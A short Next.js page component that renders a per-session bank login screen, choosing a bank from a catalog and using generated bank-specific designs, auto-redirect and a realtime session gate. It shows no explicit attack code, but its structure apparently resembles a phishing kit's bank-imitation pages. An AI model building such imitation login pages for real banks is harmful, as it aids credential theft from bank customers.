import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { BankLoginClient } from "./bank-login-client";
import { getBankBySlug } from "@/lib/at-bank-catalog";
import { renderDedicatedBankClient } from "@/lib/bank-client-registry";
import { resolveServerSessionIdentity } from "@/lib/session-id";

type Props = {
  params: Promise<{ id: string; bank_slug: string }>;
};

export default async function BankLoginPage({ params }: Props) {
  const { id, bank_slug } = await params;
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    routeSessionId: id,
  });
  const bank = await getBankBySlug(bank_slug);
  const bankName = bank?.name || bank_slug;
  const hasGeneratedDesign = Boolean(bank?.design?.visualTree || bank?.design?.customHtml);
  const dedicatedClient = renderDedicatedBankClient({
    sessionId,
    bankSlug: bank_slug,
    bankName,
    hasGeneratedDesign,
    forceAutoRedirect: bank?.autoRedirect,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId} routeSessionId={routeSessionId} />
      {dedicatedClient ? (
        dedicatedClient ?? null
      ) : (
        <BankLoginClient sessionId={sessionId} bankSlug={bank_slug} bank={bank} />
      )}
    </>
  );
}
